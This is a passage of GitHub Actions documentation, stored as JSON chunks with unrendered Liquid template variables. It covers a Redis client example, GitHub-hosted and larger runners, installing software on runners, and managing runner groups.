\"octocat\", \"Cat and Octopus\");\n  console.log(\"Reply: \" + SetFieldOctocatReply);\n  // Sets a key to \"species\", field to \"dinotocat\", and \"value\" to \"Dinosaur and Octopus\"\n  const SetFieldDinotocatReply = await redisClient.hSet(\"species\", \"dinotocat\", \"Dinosaur and Octopus\");\n  console.log(\"Reply: \" + SetFieldDinotocatReply);\n  // Sets a key to \"species\", field to \"robotocat\", and \"value\" to \"Cat and Robot\"\n  const SetFieldRobotocatReply = await redisClient.hSet(\"species\", \"robotocat\", \"Cat and Robot\");\n  console.log(\"Reply: \" + SetFieldRobotocatReply);\n\n  try {\n    // Gets all fields in \"spec", "Y2h1bmtfNV9pbmRleF8xODc=": "ies\" key\n    const replies = await redisClient.hKeys(\"species\");\n    console.log(replies.length + \" replies:\");\n    replies.forEach((reply, i) => {\n        console.log(\"    \" + i + \": \" + reply);\n    });\n    await redisClient.quit();\n  }\n  catch (err) {\n    // statements to handle any exceptions\n  }\n})();\n```\n\nThe script creates a new Redis client using the `createClient` method, which accepts a `host` and `port` parameter. The script uses the `REDIS_HOST` and `REDIS_PORT` environment variables to set the client's IP address and port. If `host` and `port` are not defined, the default host is `localhost` and the default port is 6379.\n\nThe script uses the `set` and `hset` methods to populate the database with some keys, fields, and values. To confirm that the Redis client contains the data, the script prints the contents of the database to the console log.\n\nWhen you run this workflow, you should see the following output in the \"Connect to Redis\" step confirming you created the Redis client and added data:\n\n```shell\nReply: OK\nReply: 1\nReply: 1\nReply: 1\n3 replies:\n    0: octocat\n    1: dinotocat\n    2: robotocat\n```\n\n", "Y2h1bmtfMF9pbmRleF8xODg=": "\n\nOverview of {% data variables.product.prodname_dotcom %}-hosted runners\n\nRunners are the machines that execute jobs in a {% data variables.product.prodname_actions %} workflow. For example, a runner can clone your repository locally, install testing software, and then run commands that evaluate your code.\n\n{% data variables.product.prodname_dotcom %} provides runners that you can use to run your jobs, or you can host your own runners. Each {% data variables.product.prodname_dotcom %}-hosted runner is a new virtual machine (VM) hosted by {% data variables.product.prodname_dotcom %} with the runner application and other tools preinstalled, and is available with Ubuntu Linux, Windows, or macOS operating systems. When you use a {% data variables.product.prodname_dotcom %}-hosted runner, machine maintenance and upgrades are taken care of for you.\n\n{% ifversion github-hosted-runners-emus-entitlements %}\n\n{% note %}\n\n**Note:** {% data reusables.actions.entitlement-minutes-emus %} For more information, see \"AUTOTITLE.\"\n\n{% endnote %}\n\n{% endif %}\n\n{% ifversion not ghes %}\n\n\n\nUsing a {% data variables.product.prodname_dotcom %}-hosted runner\n\nTo use a {% data variables.product.prodname_dotcom %}-hosted runner, create a job and use `runs-on` to specify the type of runner that will process the job, such as `ubuntu-latest`, `windows-latest`, or `macos-latest`. For the full list of runner types, see \"AUTOTITLE.\"{% ifversion repository-actions-runners %} If you have `repo: write` access to a repository, you can view a list of the runners available to use in workflows in the repository. For more information, see \"Viewing available runners for a repository.\"{% endif %}\n\nWhen the job begins, {% data variables.product.prodname_dotcom %} automatically provisions a new VM for that job. All steps in the job execute on the VM, allowing the steps in that job to share information using the runner's filesystem. You can run workflows directly on the VM or in a Docker container. When the job has finished, the VM is automatically decommis", "Y2h1bmtfMV9pbmRleF8xODg=": "sioned.\n\nThe following diagram demonstrates how two jobs in a workflow are executed on two different {% data variables.product.prodname_dotcom %}-hosted runners.\n\n!Diagram of a workflow that consists of two jobs. One job runs on Ubuntu and the other runs on Windows.\n\nThe following example workflow has two jobs, named `Run-npm-on-Ubuntu` and `Run-PSScriptAnalyzer-on-Windows`. When this workflow is triggered, {% data variables.product.prodname_dotcom %} provisions a new virtual machine for each job.\n\n- The job named `Run-npm-on-Ubuntu` is executed on a Linux VM, because the job's `runs-on:` specifies `ubuntu-latest`.\n- The job named `Run-PSScriptAnalyzer-on-Windows` is executed on a Windows VM, because the job's `runs-on:` specifies `windows-latest`.\n\n```yaml copy\nname: Run commands on different operating systems\non:\n  push:\n    branches: [ main ]\n  pull_request:\n    branches: [ main ]\n\njobs:\n  Run-npm-on-Ubuntu:\n    name: Run npm on Ubuntu\n    runs-on: ubuntu-latest\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - uses: {% data reusables.actions.action-setup-node %}\n        with:\n          node-version: '14'\n      - run: npm help\n\n  Run-PSScriptAnalyzer-on-Windows:\n    name: Run PSScriptAnalyzer on Windows\n    runs-on: windows-latest\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - name: Install PSScriptAnalyzer module\n        shell: pwsh\n        run: |\n          Set-PSRepository PSGallery -InstallationPolicy Trusted\n          Install-Module PSScriptAnalyzer -ErrorAction Stop\n      - name: Get list of rules\n        shell: pwsh\n        run: |\n          Get-ScriptAnalyzerRule\n```\n\nWhile the job runs, the logs and output can be viewed in the {% data variables.product.prodname_dotcom %} UI:\n\n!Screenshot of a workflow run. The steps for the \"Run PSScriptAnalyzer on Windows\" job are displayed.\n\n{% data reusables.actions.runner-app-open-source %}\n\n{% ifversion repository-actions-runners %}\n\n\n\nViewing available runners for a repository\n\n{% note %}\n\n**Note:** This f", "Y2h1bmtfMl9pbmRleF8xODg=": "eature is currently in beta and subject to change.\n\n{% endnote %}\n\n{% data reusables.actions.about-viewing-runner-list %}\n\n{% data reusables.repositories.navigate-to-repo %}\n{% data reusables.repositories.actions-tab %}\n{% data reusables.repositories.repository-runners %}\n1. Review the list of available GitHub-hosted runners for the repository.\n{% data reusables.actions.copy-runner-label %}\n\n{% data reusables.actions.actions-tab-new-runners-note %}\n\n{% endif %}\n\n\n\nSupported runners and hardware resources\n\n{% ifversion actions-hosted-runners %}\n\n{% note %}\n\n**Note**: {% data variables.product.prodname_dotcom %} also offers {% data variables.actions.hosted_runner %}s, which are available in larger configurations for Linux, Windows, and macOS virtual machines. Autoscaling is enabled by default and optional dedicated IP addresses are available for Linux and Windows. For more information, see \"AUTOTITLE.\"\n\n{% endnote %}\n{% endif %}\n\n{% data reusables.actions.supported-github-runners %}\n\nWorkflow logs list the runner used to run a job. For more information, see \"AUTOTITLE.\"\n\n\n\n{% data variables.actions.hosted_runner_caps %}s\n\n{% data reusables.actions.about-larger-runners %}\n\nFor more information, see \"AUTOTITLE.\"\n\n\n\nSupported software\n\nThe software tools included in {% data variables.product.prodname_dotcom %}-hosted runners are updated weekly. The update process takes several days, and the list of preinstalled software on the `main` branch is updated after the whole deployment ends.\n\n\n\nPreinstalled software\n\nWorkflow logs include a link to the preinstalled tools on the exact runner. To find this information in the workflow log, expand the `Set up job` section. Under that section, expand the `Runner Image` section. The link following `Included Software` will describe the preinstalled tools on the runner that ran the workflow.\n\nFor more information, see \"AUTOTITLE.\" For the overall list of included tools for each runner operating system, see the Available Images documentation the runner images repository.\n\n{% data vari", "Y2h1bmtfM19pbmRleF8xODg=": "ables.product.prodname_dotcom %}-hosted runners include the operating system's default built-in tools, in addition to the packages listed in the above references. For example, Ubuntu and macOS runners include `grep`, `find`, and `which`, among other default tools.\n\n{% ifversion actions-sbom %}\n\nYou can also view a software bill of materials (SBOM) for each build of the Windows and Ubuntu runner images. For more information, see \"AUTOTITLE.\"\n\n{% endif %}\n\n\n\nUsing preinstalled software\n\nWe recommend using actions to interact with the software installed on runners. This approach has several benefits:\n- Usually, actions provide more flexible functionality like versions selection, ability to pass arguments, and parameters\n- It ensures the tool versions used in your workflow will remain the same regardless of software updates\n\nIf there is a tool that you'd like to request, please open an issue at actions/runner-images. This repository also contains announcements about all major software updates on runners.\n\n\n\nInstalling additional software\n\nYou can install additional software on {% data variables.product.prodname_dotcom %}-hosted runners. For more information, see \"AUTOTITLE\".\n\n\n\nCloud hosts used by {% data variables.product.prodname_dotcom %}-hosted runners\n\n{% data variables.product.prodname_dotcom %} hosts Linux and Windows runners on `Standard_DS2_v2` virtual machines in Microsoft Azure with the {% data variables.product.prodname_actions %} runner application installed. The {% data variables.product.prodname_dotcom %}-hosted runner application is a fork of the Azure Pipelines Agent. Inbound ICMP packets are blocked for all Azure virtual machines, so ping or traceroute commands might not work. For more information about the `Standard_DS2_v2` resources, see \"Dv2 and DSv2-series\" in the Microsoft Azure documentation. {% data variables.product.prodname_dotcom %} hosts macOS runners in Azure data centers.\n\n\n\nWorkflow continuity\n\n{% data reusables.actions.runner-workflow-continuity %}\n\nIn addition, if the workflow run ha", "Y2h1bmtfNF9pbmRleF8xODg=": "s been successfully queued, but has not been processed by a {% data variables.product.prodname_dotcom %}-hosted runner within 45 minutes, then the queued workflow run is discarded.\n\n\n\nAdministrative privileges\n\nThe Linux and macOS virtual machines both run using passwordless `sudo`. When you need to execute commands or install tools that require more privileges than the current user, you can use `sudo` without needing to provide a password. For more information, see the \"Sudo Manual.\"\n\nWindows virtual machines are configured to run as administrators with User Account Control (UAC) disabled. For more information, see \"How User Account Control works\" in the Windows documentation.\n\n\n\nIP addresses\n\nTo get a list of IP address ranges that {% data variables.product.prodname_actions %} uses for {% data variables.product.prodname_dotcom %}-hosted runners, you can use the {% data variables.product.prodname_dotcom %} REST API. For more information, see the `actions` key in the response of the \"AUTOTITLE\" endpoint.\n\nWindows and Ubuntu runners are hosted in Azure and subsequently have the same IP address ranges as the Azure datacenters. macOS runners are hosted in {% data variables.product.prodname_dotcom %}'s own macOS cloud.\n\nSince there are so many IP address ranges for {% data variables.product.prodname_dotcom %}-hosted runners, we do not recommend that you use these as allowlists for your internal resources. Instead, we recommend you use {% data variables.actions.hosted_runner %}s with a static IP address range, or self-hosted runners. For more information, see \"AUTOTITLE\" or \"AUTOTITLE.\"\n\nThe list of {% data variables.product.prodname_actions %} IP addresses returned by the API is updated once a week.\n\n\n\nThe `etc/hosts` file\n\n{% data reusables.actions.runners-etc-hosts-file %}\n\n\n\nFile systems\n\n{% data variables.product.prodname_dotcom %} executes actions and shell commands in specific directories on the virtual machine. The file paths on virtual machines are not static. Use the environment variables {% data variables.p", "Y2h1bmtfNV9pbmRleF8xODg=": "roduct.prodname_dotcom %} provides to construct file paths for the `home`, `workspace`, and `workflow` directories.\n\n| Directory | Environment variable | Description |\n|-----------|----------------------|-------------|\n| `home` | `HOME` | Contains user-related data. For example, this directory could contain credentials from a login attempt. |\n| `workspace` | `GITHUB_WORKSPACE` | Actions and shell commands execute in this directory. An action can modify the contents of this directory, which subsequent actions can access. |\n| `workflow/event.json` | `GITHUB_EVENT_PATH` | The `POST` payload of the webhook event that triggered the workflow. {% data variables.product.prodname_dotcom %} rewrites this each time an action executes to isolate file content between actions.\n\nFor a list of the environment variables {% data variables.product.prodname_dotcom %} creates for each workflow, see \"AUTOTITLE.\"\n\n\n\nDocker container filesystem\n\nActions that run in Docker containers have static directories under the `/github` path. However, we strongly recommend using the default environment variables to construct file paths in Docker containers.\n\n{% data variables.product.prodname_dotcom %} reserves the `/github` path prefix and creates three directories for actions.\n\n- `/github/home`\n- `/github/workspace` - {% data reusables.repositories.action-root-user-required %}\n- `/github/workflow`\n\n\n\nFurther reading\n\n- \"AUTOTITLE\"\n- You can use a matrix strategy to run your jobs on multiple images. For more information, see \"AUTOTITLE.\"\n\n{% endif %}\n\n", "Y2h1bmtfMF9pbmRleF8xODk=": "\n\nInstalling software on Ubuntu runners\n\nThe following example demonstrates how to install an `apt` package as part of a job.\n\n```yaml\nname: Build on Ubuntu\non: push\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Check out repository code\n        uses: {% data reusables.actions.action-checkout %}\n      - name: Install jq tool\n        run: |\n          sudo apt-get update\n          sudo apt-get install jq\n```\n\n{% note %}\n\n**Note:** Always run `sudo apt-get update` before installing a package. In case the `apt` index is stale, this command fetches and re-indexes any available packages, which helps prevent package installation failures.\n\n{% endnote %}\n\n\n\nInstalling software on macOS runners\n\nThe following example demonstrates how to install Brew packages and casks as part of a job.\n\n```yaml\nname: Build on macOS\non: push\n\njobs:\n  build:\n    runs-on: macos-latest\n    steps:\n      - name: Check out repository code\n        uses: {% data reusables.actions.action-checkout %}\n      - name: Install GitHub CLI\n        run: |\n          brew update\n          brew install gh\n      - name: Install Microsoft Edge\n        run: |\n          brew update\n          brew install --cask microsoft-edge\n```\n\n\n\nInstalling software on Windows runners\n\nThe following example demonstrates how to use Chocolatey to install the {% data variables.product.prodname_dotcom %} CLI as part of a job.\n\n{% raw %}\n\n```yaml\nname: Build on Windows\non: push\njobs:\n  build:\n    runs-on: windows-latest\n    steps:\n      - run: choco install gh\n      - run: gh version\n```\n\n{% endraw %}\n\n", "Y2h1bmtfMF9pbmRleF8xOTA=": "\n\nViewing active jobs in your organization or enterprise\n\nYou can get a list of all jobs currently running on {% data variables.product.prodname_dotcom %}-hosted runners in your organization or enterprise.\n\n{% data reusables.actions.github-hosted-runners-navigate-to-repo-org-enterprise %}\n{% data reusables.actions.github-hosted-runners-table-entry %}\n1. Review the \"Active jobs\" section, which contains a list of all jobs currently running on {% data variables.product.prodname_dotcom %}-hosted runners.\n\n\n\nViewing queued jobs in your organization or enterprise\n\n{% data variables.product.prodname_dotcom %}-hosted runners allow you to run jobs concurrently, and the maximum number of concurrent jobs will vary depending on your plan. If you reach the maximum number of concurrent jobs, any new jobs will start to enter a queue. To find out more about the number of concurrent jobs available to your plan, see \"AUTOTITLE.\"\n\nThe following procedure demonstrates how to check the maximum number of concurrent jobs you can run.\n\n{% data reusables.actions.github-hosted-runners-navigate-to-repo-org-enterprise %}\n{% data reusables.actions.github-hosted-runners-table-entry %}\n1. Review the \"All jobs usage\" section, which lists the number of active jobs and the maximum number of jobs you can run.\n\n", "Y2h1bmtfMF9pbmRleF8xOTE=": "\n\nOverview of {% data variables.actions.hosted_runner %}s\n\n{% data reusables.actions.about-larger-runners %}\n\n{% data variables.product.prodname_dotcom %} offers {% data variables.actions.hosted_runner %}s with macOS, Ubuntu, or Windows operating systems, and different features are available depending on which operating system you use. For more information, see \"Additional features for {% data variables.actions.hosted_runner %}s.\"\n\n\n\nAbout Ubuntu and Windows {% data variables.actions.hosted_runner %}s\n\n{% data variables.actions.hosted_runner_caps %}s with Ubuntu or Windows operating systems are configured in your organization or enterprise. When you add a {% data variables.actions.hosted_runner %}, you are defining a type of machine from a selection of available hardware specifications and operating system images. {% data variables.product.prodname_dotcom %} will then create multiple instances of this runner that scale up and down to match the job demands of your organization, based on the autoscaling limits you define. For more information, see \"AUTOTITLE.\"\n\nUbuntu and Windows {% data variables.actions.hosted_runner %}s offer autoscaling capabilities and the ability to assign the runners static IP addresses from a specific range. They can also be managed using runner groups, which enables you to control access to the {% data variables.actions.hosted_runner %}s. For more information, see \"Additional features for {% data variables.actions.hosted_runner %}s.\"\n\n\n\nAbout macOS {% data variables.actions.hosted_runner %}s\n\n {% data variables.actions.hosted_runner_caps %}s with a macOS operating system are used by updating the YAML workflow label to the desired runner image. To run your workflows on a macOS {% data variables.actions.hosted_runner %}, update the `runs-on` key to use one of the {% data variables.product.company_short %}-defined macOS {% data variables.actions.hosted_runner %} labels. No additional configuration is required. For more information, see \"AUTOTITLE.\"\n\nThe following machines sizes are available ", "Y2h1bmtfMV9pbmRleF8xOTE=": "for macOS {% data variables.actions.hosted_runner %}s.\n\n| Runner Size | Architecture| Processor (CPU)| Memory (RAM)  | Storage (SSD) | YAML workflow label |\n| --------------| --------------| -------------- | ------------- | ------------- | --------------------- |\n| Large | Intel| 12             | 30 GB         | 14 GB         | macos-latest-large, macos-12-large , macos-13-large[Beta] |\n| XLarge| arm64 (M1)|6 CPU and 8 GPU| 14 GB         | 14 GB        | macos-latest-xlarge[Beta], macos-13-xlarge[Beta]   |\n\n\n\nLimitations for macOS {% data variables.actions.hosted_runner %}s\n\n- All actions provided by {% data variables.product.prodname_dotcom %} are compatible with arm64 {% data variables.product.prodname_dotcom %}-hosted runners. However, community actions may not be compatible with arm64 and need to be manually installed at runtime. For more information, see \"AUTOTITLE.\"\n- Due to a limitation of Apple's Virtualization Framework, which our hypervisor uses, nested-virtualization is not supported by arm64 runners.\n\n\n\nAdditional features for {% data variables.actions.hosted_runner %}s\n\nCompared to standard {% data variables.product.prodname_dotcom %}-hosted runners, {% data variables.actions.hosted_runner %}s have additional features, and their availability varies depending on the {% data variables.actions.hosted_runner %}'s operating system.\n\n{% rowheaders %}\n\n| Operating system                             | Ubuntu | Windows | macOS |\n| -------------------------------------------- | ------ | ------- | ----- |\n| Hardware acceleration for Android SDK tools  | {% octicon \"check\" aria-label=\"Supported\" %} | {% octicon \"x\" aria-label=\"Not supported\" %} | {% octicon \"x\" aria-label=\"Not supported\" %} |\n| Static IP addresses | {% octicon \"check\" aria-label=\"Supported\" %} | {% octicon \"check\" aria-label=\"Supported\" %} | {% octicon \"x\" aria-label=\"Not supported\" %} |\n| Autoscaling | {% octicon \"check\" aria-label=\"Supported\" %} | {% octicon \"check\" aria-label=\"Supported\" %} | {% octicon \"x\" aria-label=\"Not supported\" %} |\n| R", "Y2h1bmtfMl9pbmRleF8xOTE=": "unner groups | {% octicon \"check\" aria-label=\"Supported\" %} | {% octicon \"check\" aria-label=\"Supported\" %} | {% octicon \"x\" aria-label=\"Not supported\" %} |\n\n{% endrowheaders %}\n\nThese features can enhance your CI/CD pipelines in the following ways.\n\n- Hardware acceleration for the Android SDK tools makes running Android tests much faster and consumes fewer minutes. For more information on Android hardware acceleration, see Configure hardware acceleration for the Android Emulator in the Android Developers documentation.\n- Assigning {% data variables.actions.hosted_runner %}s  static IP addresses from a specific range enables you to use this range to configure a firewall allowlist. For more information, see \"Networking for {% data variables.actions.hosted_runner %}s.\"\n- Autoscaling enables {% data variables.actions.hosted_runner %}s  to scale up to a maximum limit set by you, so your workflows can run concurrently. For more information, see \"Autoscaling {% data variables.actions.hosted_runner %}s.\"\n- Runner groups allow you to control access to {% data variables.actions.hosted_runner %}s for your organizations, repositories, and workflows. For more information, see \"AUTOTITLE.\"\n\nFor a full list of included tools for each runner operating system, see the {% data variables.product.prodname_actions %} Runner Images repository.\n\n\n\nUnderstanding billing\n\n{% note %}\n\n**Note**: {% data variables.actions.hosted_runner_caps %}s are not eligible for the use of included minutes on private repositories. For both private and public repositories, when {% data variables.actions.hosted_runner %}s are in use, they will always be billed at the per-minute rate.\n\n{% endnote %}\n\nCompared to standard {% data variables.product.prodname_dotcom %}-hosted runners, {% data variables.actions.hosted_runner %}s are billed differently. {% data reusables.actions.about-larger-runners-billing %} For more information, see \"AUTOTITLE.\"\n\n\n\nMachine sizes for {% data variables.actions.hosted_runner %}s\n\n| Processor (CPU)| Memory (RAM)  | Storage (SSD) |", "Y2h1bmtfM19pbmRleF8xOTE=": " Operating system (OS) |\n| -------------- | ------------- | ------------- | --------------------- |\n| 6              | 14 GB         | 14 GB         | macOS                 |\n| 12             | 30 GB         | 14 GB         | macOS                 |\n| 4              | 16 GB         | 150 GB        | Ubuntu                |\n| 8              | 32 GB         | 300 GB        | Ubuntu, Windows       |\n| 16             | 64 GB         | 600 GB        | Ubuntu, Windows       |\n| 32             | 128 GB        | 1200 GB       | Ubuntu, Windows       |\n| 64             | 256 GB        | 2040 GB       | Ubuntu, Windows       |\n\n\n\nAbout runner groups\n\n{% note %}\n\n**Note:** Only {% data variables.actions.hosted_runner %}s with Linux or Windows operating systems can be assigned to runner groups.\n\n{% endnote %}\n\nRunner groups enable administrators to control access to runners at the organization and enterprise levels. With runner groups, you can collect sets of runners and create a security boundary around them. You can then decide which organizations or repositories are permitted to run jobs on those sets of machines. During the {% data variables.actions.hosted_runner %} deployment process, the runner can be added to an existing group, otherwise it will join a default group. You can create a group by following the steps in \"AUTOTITLE.\"\n\n\n\nArchitectural overview of {% data variables.actions.hosted_runner %}s\n\n{% note %}\n\n**Note:** This architecture diagram only applies to {% data variables.actions.hosted_runner %}s with Linux or Windows operating systems.\n\n{% endnote %}\n\n{% data variables.actions.hosted_runner_caps %}s are managed at the organization level, where they are arranged into groups that can contain multiple instances of the runner. They can also be created at the enterprise level and shared with organizations in the hierarchy. Once you've created a group, you can then add a runner to the group and update your workflows to target either the group name or the label assigned to the {% data variables.actions.hosted_runn", "Y2h1bmtfNF9pbmRleF8xOTE=": "er %}. You can also control which repositories are permitted to send jobs to the group for processing. For more information about groups, see \"AUTOTITLE.\"\n\nIn the following diagram, a class of hosted runner named `ubuntu-20.04-16core` has been defined with customized hardware and operating system configuration.\n\n!Diagram showing a larger runner being used by a workflow because of the runner's label.\n\n1. Instances of this runner are automatically created and added to a group called `grp-ubuntu-20.04-16core`.\n1. The runners have been assigned the label `ubuntu-20.04-16core`.\n1. Workflow jobs use the `ubuntu-20.04-16core` label in their `runs-on` key to indicate the type of runner they need to execute the job.\n1. {% data variables.product.prodname_actions %} checks the runner group to see if your repository is authorized to send jobs to the runner.\n1. The job runs on the next available instance of the `ubuntu-20.04-16core` runner.\n\n\n\nAutoscaling {% data variables.actions.hosted_runner %}s\n\n{% note %}\n\n**Note:** Autoscaling is only available for {% data variables.actions.hosted_runner %}s with Linux or Windows operating systems.\n\n{% endnote %}\n\n{% data variables.actions.hosted_runner_caps %}s can automatically scale to suit your needs. You can provision machines to run a specified maximum number of jobs when jobs are submitted for processing. Each machine only handles one job at a time, so these settings effectively determine the number of jobs that can be run concurrently.\n\nYou can configure the maximum job concurrency, which allows you to control your costs by setting the maximum parallel number of jobs that can be run using this set. A higher value here can help avoid workflows being blocked due to parallelism. For more information, see \"AUTOTITLE.\"\n\n\n\nNetworking for {% data variables.actions.hosted_runner %}s\n\n{% note %}\n\n**Note:** Assigning static IP addresses to runners is only available for {% data variables.actions.hosted_runner %}s with Linux or Windows operating systems.\n\n{% endnote %}\n\nBy default, {% data ", "Y2h1bmtfNV9pbmRleF8xOTE=": "variables.actions.hosted_runner %}s receive a dynamic IP address that changes for each job run. Optionally, {% data variables.product.prodname_ghe_cloud %} customers can configure their {% data variables.actions.hosted_runner %}s to receive a static IP address from {% data variables.product.prodname_dotcom %}'s IP address pool. For more information, see \"AUTOTITLE.\"\n\nWhen enabled, instances of the {% data variables.actions.hosted_runner %} will receive IP addresses from specific ranges that are unique to the runner, allowing you to use the ranges to configure a firewall allowlist. {% ifversion fpt %}You can use up to 10 {% data variables.actions.hosted_runner %}s with static IP address ranges in total across all your {% data variables.actions.hosted_runner %}s{% endif %}{% ifversion ghec %}You can use up to 10 {% data variables.actions.hosted_runner %}s with static IP address ranges for the {% data variables.actions.hosted_runner %}s created at the enterprise level. In addition, you can use up to 10 {% data variables.actions.hosted_runner %}s with static IP address ranges for the {% data variables.actions.hosted_runner %}s created at the organization level, for each organization in your enterprise{% endif %}. For more information, see \"AUTOTITLE.\"\n\n{% data reusables.actions.larger-runner-static-ip-contact-support %}\n\n{% note %}\n\n**Note**: If runners are unused for more than 30 days, their IP address ranges are automatically removed and cannot be recovered.\n\n{% endnote %}\n\n", "Y2h1bmtfMF9pbmRleF8xOTI=": "\n\nAbout runner groups\n\n{% data reusables.actions.about-runner-groups %}\n\n\n\nManaging access to your runners\n\n{% note %}\n\n**Note**: Before your workflows can send jobs to {% data variables.actions.hosted_runner %}s, you must first configure permissions for the runner group. See the following sections for more information.\n\n{% endnote %}\n\nRunner groups are used to control which repositories can run jobs on your {% data variables.actions.hosted_runner %}s. You must manage access to the group from each level of the management hierarchy, depending on where you've defined the {% data variables.actions.hosted_runner %}:\n\n- **Runners at the enterprise level**: {% data reusables.actions.about-enterprise-level-runner-groups %}\n- **Runners at the organization level**: {% data reusables.actions.about-organization-level-runner-groups %}\n\nFor example, the following diagram has a runner group named `grp-ubuntu-20.04-16core` at the enterprise level. Before the repository named `octo-repo` can use the runners in the group, you must first configure the group at the enterprise level to allow access to the `octo-org` organization. You must then configure the group at the organization level to allow access to `octo-repo`.\n\n!Diagram that shows a lock between a runner group at the enterprise level and an organization, and between the organization and two repositories owned by the organization.\n\n\n\nCreating a runner group for an organization\n\n{% data reusables.actions.hosted-runner-security-admonition %}\n{% data reusables.actions.creating-a-runner-group-for-an-organization %}\n\n{% ifversion ghec or ghes or ghae %}\n\n\n\nCreating a runner group for an enterprise\n\n{% data reusables.actions.hosted-runner-security-admonition %}\n{% data reusables.actions.creating-a-runner-group-for-an-enterprise %}\n\n{% endif %}\n\n{% data reusables.actions.section-using-unique-names-for-runner-groups %}\n\n{% ifversion ghec %}\n\n\n\nChanging which organizations can access a runner group\n\n{% data reusables.actions.hosted-runner-security-admonition %}\n\nFor runner groups in", "Y2h1bmtfMV9pbmRleF8xOTI=": " an enterprise, you can change what organizations in the enterprise can access a runner group.\n\n{% data reusables.actions.runner-groups-enterprise-navigation %}\n{% data reusables.actions.changing-organization-access-for-a-runner-group %}\n\n{% endif %}\n\n\n\nChanging which repositories can access a runner group\n\n{% data reusables.actions.hosted-runner-security-admonition %}\n\nFor runner groups in an organization, you can change what repositories in the organization can access a runner group.\n\n{% data reusables.actions.runner-groups-org-navigation %}\n{% data reusables.actions.changing-repository-access-for-a-runner-group %}\n\n{% ifversion restrict-groups-to-workflows %}\n\n\n\nChanging which workflows can access a runner group\n\n{% data reusables.actions.hosted-runner-security-admonition %}\n\n{% data reusables.actions.about-restricting-workflow-access-with-runner-groups %}\n\n- Changing which workflows can access an organization runner group\n- Changing which workflows can access an enterprise runner group\n\n{% ifversion actions-private-networking-azure-vnet %}\n\n\n\nConfiguring private network access for larger runners\n\n{% data reusables.actions.azure-vnet-injected-runners-intro %}\n\nIf you have configured your enterprise to connect to an Azure VNET, you can give runner groups access to the virtual network. For more information, see \"AUTOTITLE.\"\n\n{% endif %}\n\n\n\nChanging which workflows can access an organization runner group\n\n{% data reusables.actions.runner-groups-org-navigation %}\n{% data reusables.actions.changing-workflow-access-for-a-runner-group %}\n\n\n\nChanging which workflows can access an enterprise runner group\n\n{% data reusables.actions.runner-groups-enterprise-navigation %}\n{% data reusables.actions.changing-workflow-access-for-a-runner-group %}\n\n{% endif %}\n\n\n\nChanging the name of a runner group\n\n{% ifversion ghec %}\nYou can rename runner groups at the enterprise and organization levels.\n\n- Changing the name of an organization runner group\n- Changing the name of an enterprise runner group\n\n\n\nChanging the name of an organiz", "Y2h1bmtfMl9pbmRleF8xOTI=": "ation runner group\n\n{% endif %}\n\n{% data reusables.actions.runner-groups-org-navigation %}\n{% data reusables.actions.changing-the-name-of-a-runner-group %}\n\n{% ifversion ghec %}\n\n\n\nChanging the name of an enterprise runner group\n\n{% data reusables.actions.runner-groups-enterprise-navigation %}\n{% data reusables.actions.changing-the-name-of-a-runner-group %}\n{% endif %}\n\n\n\nMoving a runner to a group\n\n{% data reusables.actions.about-moving-a-runner-to-a-group %}\n{% ifversion ghec %}\n\n- Moving an organization runner to a group\n- Moving an enterprise runner to a group\n\n\n\nMoving an organization runner to a group\n\n{% endif %}\n\n{% data reusables.organizations.navigate-to-org %}\n{% data reusables.organizations.org_settings %}\n{% data reusables.organizations.settings-sidebar-actions-runners %}\n{% data reusables.actions.moving-a-runner-to-a-group %}\n\n{% ifversion ghec %}\n\n\n\nMoving an enterprise runner to a group\n\n{% data reusables.enterprise-accounts.access-enterprise %}\n{% data reusables.enterprise-accounts.policies-tab %}\n{% data reusables.enterprise-accounts.actions-tab %}\n{% data reusables.enterprise-accounts.actions-runners-tab %}\n{% data reusables.actions.moving-a-runner-to-a-group %}\n{% endif %}\n\n\n\nRemoving a runner group\n\n{% data reusables.actions.about-removing-a-runner-group %}\n{% ifversion ghec %}\n\n- Removing a runner group from an organization\n- Removing a runner group from an enterprise\n\n\n\nRemoving a runner group from an organization\n\n{% endif %}\n\n{% data reusables.actions.runner-groups-org-navigation %}\n{% data reusables.actions.removing-a-runner-group %}\n\n{% ifversion ghec %}\n\n\n\nRemoving a runner group from an enterprise\n\n{% data reusables.actions.runner-groups-enterprise-navigation %}\n{% data reusables.actions.removing-a-runner-group %}\n{% endif %}\n\n", "Y2h1bmtfMF9pbmRleF8xOTM=": "\n\nAdding a {% data variables.actions.hosted_runner %} to an enterprise\n\nEnterprise owners can add {% data variables.actions.hosted_runner %}s to an enterprise and assign them to organizations. By default, when a {% data variables.actions.hosted_runner %} is created for an enterprise, it is added to a default runner group that all organizations in the enterprise have access to. While all organizations are granted access to the runner, the repositories in each organization **are not** granted access. For each organization, an organization owner must configure the runner group to specify which repositories have access to the enterprise runner. For more information, see \"Allowing repositories to access a runner group.\"\n\n{% data reusables.actions.add-hosted-runner-overview %}\n\n{% data reusables.enterprise-accounts.access-enterprise %}\n{% data reusables.enterprise-accounts.policies-tab %}\n{% data reusables.enterprise-accounts.actions-tab %}\n{% data reusables.enterprise-accounts.actions-runners-tab %}\n{% data reusables.actions.add-hosted-runner %}\n{% data reusables.actions.org-access-to-github-hosted-runners %}\n\n{% endif %}\n\n\n\nAdding a {% data variables.actions.hosted_runner %} to an organization\n\nYou can add a {% data variables.actions.hosted_runner %} to an organization, where organization owners can control which repositories can use it. When you create a new runner for an organization, by default, all repositories in the organization have access to the runner. To limit which repositories can use the runner, assign it to a runner group with access to specific repositories. For more information, see \"Allowing repositories to access a runner group.\"\n\n{% data reusables.actions.add-hosted-runner-overview %}\n\n{% data reusables.organizations.navigate-to-org %}\n{% data reusables.organizations.org_settings %}\n{% data reusables.organizations.settings-sidebar-actions-runners %}\n{% data reusables.actions.add-hosted-runner %}\n1. To allow repositories to access your {% data variables.actions.hosted_runner %}s, add them to the lis", "Y2h1bmtfMV9pbmRleF8xOTM=": "t of repositories that can use it. For more information, see \"Allowing repositories to access {% data variables.actions.hosted_runner %}s.\"\n\n\n\nAllowing repositories to access {% data variables.actions.hosted_runner %}s\n\nRepositories are granted access to {% data variables.actions.hosted_runner %}s through runner groups. Enterprise administrators can choose which organizations are granted access to enterprise-level runner groups, and organization owners control repository-level access to all {% data variables.actions.hosted_runner %}s. Organization owners can use and configure enterprise-level runner groups for the repositories in their organization, or they can create organization-level runner groups to control access.\n\n- **For enterprise-level runner groups**: {% data 